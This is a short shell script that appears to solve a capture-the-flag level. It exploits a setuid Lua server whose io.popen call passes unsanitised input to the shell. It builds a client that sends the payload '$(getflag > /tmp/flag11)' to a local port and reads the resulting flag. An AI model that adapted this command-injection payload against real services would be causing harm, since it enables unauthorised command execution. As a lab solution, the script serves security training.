#!/bin/sh

# The level11 lua program in the home folder is running as a server
# with setuid permissions, which we can exploint thanks to this line in the
# server.
#
# prog = io.popen("echo "..pass.." | sha1sum", "r")
#
# By passing in an executable to the server it get executed in the popen function.
# So all we have to do is pass in '$(getflag > /tmp/flag)' and then read the flag.


########### CLIENT ############
if [ ! -s /tmp/client.lua ]
then
	echo '#!/usr/bin/env lua'                        > /tmp/client.lua
	echo 'local host, port = "127.0.0.1", 5151'     >> /tmp/client.lua
	echo 'local socket = require("socket")'         >> /tmp/client.lua
	echo 'local tcp = assert(socket.tcp())'         >> /tmp/client.lua
	echo                                            >> /tmp/client.lua
	echo 'tcp:connect(host, port);'                 >> /tmp/client.lua
	echo 'tcp:send("$(getflag > /tmp/flag11)\\n");' >> /tmp/client.lua
	echo                                            >> /tmp/client.lua
	echo 'tcp:close()'                              >> /tmp/client.lua
fi

lua /tmp/client.lua
cat /tmp/flag11

